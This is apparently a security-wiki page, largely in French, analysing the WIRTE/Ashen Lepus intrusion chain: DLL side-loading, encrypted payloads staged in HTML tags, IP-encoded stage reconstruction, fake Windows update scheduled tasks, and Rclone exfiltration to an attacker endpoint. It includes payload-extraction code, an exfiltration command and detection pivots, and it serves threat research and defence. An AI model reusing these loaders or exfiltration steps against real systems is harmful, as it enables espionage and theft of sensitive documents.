# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble du tradecraft

Ashen Lepus (aka WIRTE) a industrialisé un schéma répétable qui enchaîne DLL sideloading, staged HTML payloads, et des backdoors .NET modulaires pour persister au sein de réseaux diplomatiques du Moyen-Orient. La technique est réutilisable par n’importe quel opérateur car elle repose sur :

- **Ingénierie sociale basée sur les archives** : des PDFs bénins indiquent aux cibles de récupérer une archive RAR depuis un site de partage de fichiers. L’archive regroupe un EXE de visualisation de document qui semble légitime, une DLL malveillante nommée d’après une bibliothèque de confiance (par ex. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), et un faux `Document.pdf`.
- **Abus de l’ordre de recherche des DLL** : la victime double-clique sur l’EXE, Windows résout l’import de la DLL depuis le répertoire courant, et le chargeur malveillant (AshenLoader) s’exécute dans le processus de confiance pendant que le faux PDF s’ouvre pour éviter d’éveiller les soupçons.
- **Staging living-off-the-land** : chaque étape ultérieure (AshenStager → AshenOrchestrator → modules) est maintenue hors disque jusqu’à ce qu’elle soit nécessaire, livrée sous forme de blobs chiffrés dissimulés dans des réponses HTML en apparence inoffensives.

## Chaîne de Side-Loading multi-étapes

1. **EXE leurre → AshenLoader** : le EXE side-load AshenLoader, qui effectue une reconnaissance de l’hôte, le chiffre en AES-CTR, puis l’envoie en POST dans des paramètres tournants tels que `token=`, `id=`, `q=`, ou `auth=` vers des chemins ressemblant à des API (par ex. `/api/v2/account`).
2. **Extraction HTML** : le C2 ne révèle l’étape suivante que lorsque l’IP du client est géolocalisée dans la région cible et que le `User-Agent` correspond à l’implant, ce qui perturbe les sandboxes. Quand les vérifications passent, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload** : AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère davantage de HTML, cette fois en extrayant `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator** : un contrôleur .NET modulaire qui décode une config JSON encodée en Base64. Les champs `tg` et `au` de la config sont concaténés/hachés pour former la clé AES, qui déchiffre `xrk`. Les octets résultants servent de clé XOR pour chaque blob de module récupéré ensuite.
5. **Livraison des modules** : chaque module est décrit via des commentaires HTML qui redirigent le parseur vers n’importe quelle balise, contournant ainsi les règles statiques qui ne recherchent que `<headerp>` ou `<article>`. Les modules incluent la persistance (`PR*`), les uninstallers (`UN*`), la reconnaissance (`SN`), la capture d’écran (`SCT`), et l’exploration de fichiers (`FE`).

### Modèle de parsing du conteneur HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Même si les défenseurs bloquent ou suppriment un élément spécifique, l’opérateur n’a qu’à changer la balise suggérée dans le commentaire HTML pour reprendre la livraison.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallèles de l’évasion HTML Staging

Des recherches récentes sur le HTML smuggling (Talos) mettent en évidence des payloads cachés sous forme de chaînes Base64 à l’intérieur de blocs `<script>` dans des pièces jointes HTML, puis décodés via JavaScript au runtime. La même astuce peut être réutilisée pour des réponses C2 : stage des blobs chiffrés à l’intérieur d’une balise script (ou d’un autre élément DOM) et les décoder en mémoire avant AES/XOR, afin que la page ressemble à du HTML ordinaire. Talos montre aussi une obfuscation en couches (renommage d’identifiants plus Base64/Caesar/AES) dans des balises script, ce qui se transpose proprement à des blobs C2 staged en HTML. Un article Talos ultérieur sur le **hidden text salting** est également pertinent ici : séparer du Base64 avec des commentaires HTML ou des espaces sans rapport suffit à casser de simples extracteurs regex tout en gardant une reconstruction côté navigateur triviale.

## Notes sur les variantes récentes (2024-2025)

- Check Point a observé des campagnes WIRTE en 2024 qui reposaient toujours sur du sideloading basé sur des archives, mais utilisaient `propsys.dll` (stagerx64) comme première étape. Le stager décode le payload suivant avec Base64 + XOR (clé `53`), envoie des requêtes HTTP avec un `User-Agent` codé en dur, et extrait des blobs chiffrés intégrés entre des balises HTML. Dans une branche, la stage était reconstruite à partir d’une longue liste de chaînes IP intégrées décodées via `RtlIpv4StringToAddressA`, puis concaténées en octets du payload.
- OWN-CERT a documenté des outils WIRTE antérieurs où le dropper side-loaded `wtsapi32.dll` protégeait les chaînes avec Base64 + TEA et utilisait le nom de la DLL lui-même comme clé de déchiffrement, puis obfusquait les données d’identification de l’hôte avec XOR/Base64 avant de les envoyer au C2.

## Reconstruction de stages encodés en IP

La branche `propsys.dll` de WIRTE en 2024 montre que le prochain PE n’a pas besoin d’exister sous la forme d’un seul blob HTML contigu. Le loader peut stocker les octets de la stage sous forme de chaînes dotted-quad et les reconstruire avec `RtlIpv4StringToAddressA`, un schéma étroitement lié au tradecraft **IPfuscation** de Hive. Sur le plan opérationnel, c’est utile lorsque l’acteur veut que la page HTML contienne ce qui ressemble à des IOC ou à des données de configuration inoffensives plutôt qu’à un payload Base64 évident.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
If the recovered bytes begin with `MZ`, you likely reconstructed the next PE directly. If not, check for a leading XOR/Base64 layer or small delimiter chunks between addresses.

## Swappable DLL Names & Host Rotation

Une propriété forte de ce pattern est que le **backend de staging HTML/AES/XOR peut rester identique tandis que seul le paire de sideload change**. WIRTE a alterné entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, et `propsys.dll` au fil des campagnes, ce qui est utile parce que :

- `propsys.dll` et `wtsapi32.dll` sont des noms de DLL Windows banals que les defenders s’attendent à voir exister dans `%System32%` / `%SysWOW64%`.
- Les catalogues publics comme **HijackLibs** répertorient déjà de nombreux binaires qui chargeront ces noms de DLL depuis le répertoire d’une application copiée, offrant aux operators des hosts de remplacement sans devoir redessiner le stager.
- Seule la surface d’export doit être adaptée par host. Le parseur HTML, les routines AES/XOR, et le module loader peuvent généralement être transplantés inchangés dans une DLL proxy de forwarding.

Pour le travail offensif en lab, cela signifie que vous pouvez séparer le problème en **(1) trouver un host signé stable qui résout localement le nom de DLL choisi** et **(2) réutiliser la même logique de chargement HTML stagé derrière cette DLL**.

## Crypto & C2 Hardening

- **AES-CTR partout** : les loaders actuels embarquent des clés 256-bit plus des nonces (par ex., `{9a 20 51 98 ...}`) et ajoutent éventuellement une couche XOR en utilisant des chaînes comme `msasn1.dll` avant/après le déchiffrement.
- **Variations du matériel de clé** : les loaders plus anciens utilisaient Base64 + TEA pour protéger les chaînes intégrées, avec la clé de déchiffrement dérivée du nom de la DLL malveillante (par ex., `wtsapi32.dll`).
- **Séparation de l’infrastructure + camouflage par sous-domaine** : les serveurs de staging sont séparés par outil, hébergés sur différents ASNs, et parfois exposés via des sous-domaines d’apparence légitime, de sorte que griller une étape n’expose pas le reste.
- **Smuggling de reconnaissance** : les données énumérées incluent désormais les listes de Program Files pour repérer les applications à forte valeur, et elles sont toujours chiffrées avant de quitter l’hôte.
- **Rotation des URI** : les paramètres de requête et les chemins REST changent entre les campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), ce qui invalide les détections fragiles.
- **Ancrage du User-Agent + redirections sûres** : l’infrastructure C2 ne répond qu’aux chaînes UA exactes et redirige sinon vers des sites d’actualité/santé bénins pour se fondre dans le trafic.
- **Livraison contrôlée** : les serveurs sont geo-fenced et ne répondent qu’aux vrais implants. Les clients non approuvés reçoivent du HTML non suspect.

## Persistence & Execution Loop

AshenStager dépose des scheduled tasks qui se font passer pour des tâches de maintenance Windows et s’exécutent via `svchost.exe`, par ex. :

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideloading au démarrage ou à intervalles réguliers, garantissant qu’AshenOrchestrator peut demander de nouveaux modules sans retoucher le disque.

## Using Benign Sync Clients for Exfiltration

Les operators placent des documents diplomatiques dans `C:\Users\Public` (lisible par tous et non suspect) via un module dédié, puis téléchargent le binaire légitime [Rclone](https://rclone.org/) pour synchroniser ce répertoire avec le stockage de l’attaquant. Unit42 note que c’est la première fois que cet acteur est observé en train d’utiliser Rclone pour l’exfiltration, ce qui s’aligne avec la tendance plus large consistant à abuser d’outils de synchronisation légitimes pour se fondre dans le trafic normal :

1. **Stage** : copier/collecter les fichiers cible dans `C:\Users\Public\{campaign}\`.
2. **Configure** : déployer une config Rclone pointant vers un endpoint HTTPS contrôlé par l’attaquant (par ex., `api.technology-system[.]com`).
3. **Sync** : lancer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` afin que le trafic ressemble à des sauvegardes cloud normales.

Comme Rclone est largement utilisé pour des workflows de sauvegarde légitimes, les defenders doivent se concentrer sur les exécutions anormales (nouveaux binaires, remotes inhabituels, ou synchronisation soudaine de `C:\Users\Public`).

## Detection Pivots

- Alerter sur les **processus signés** qui chargent de façon inattendue des DLL depuis des chemins modifiables par l’utilisateur (filtres Procmon + `Get-ProcessMitigation -Module`), surtout lorsque les noms de DLL recoupent `netutils`, `srvcli`, `dwampi`, `wtsapi32`, ou `propsys`.
- Inspecter les réponses HTTPS suspectes à la recherche de **gros blobs Base64 intégrés dans des tags inhabituels** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Normaliser le HTML d’abord : **supprimer les commentaires et réduire les espaces avant l’extraction Base64**, car les contournements de type hidden-text-salting peuvent fractionner les payloads à travers les frontières des commentaires.
- Étendre la chasse HTML aux **chaînes Base64 dans des blocs `<script>`** (staging de style HTML smuggling) qui sont décodées via JavaScript avant le traitement AES/XOR.
- Rechercher les appels répétés à **`RtlIpv4StringToAddressA` suivis d’un assemblage de buffer**, surtout lorsque les chaînes environnantes sont de longues listes IPv4 plutôt que de vraies cibles réseau.
- Rechercher des **scheduled tasks** qui exécutent `svchost.exe` avec des arguments non liés à un service ou qui pointent vers des répertoires de dropper.
- Suivre les **redirections C2** qui ne renvoient des payloads que pour des chaînes exactes de `User-Agent` et basculent sinon vers des domaines d’actualité/santé légitimes.
- Surveiller l’apparition de binaires **Rclone** en dehors des emplacements gérés par l’IT, de nouveaux fichiers `rclone.conf`, ou de jobs de sync tirant depuis des répertoires de staging comme `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
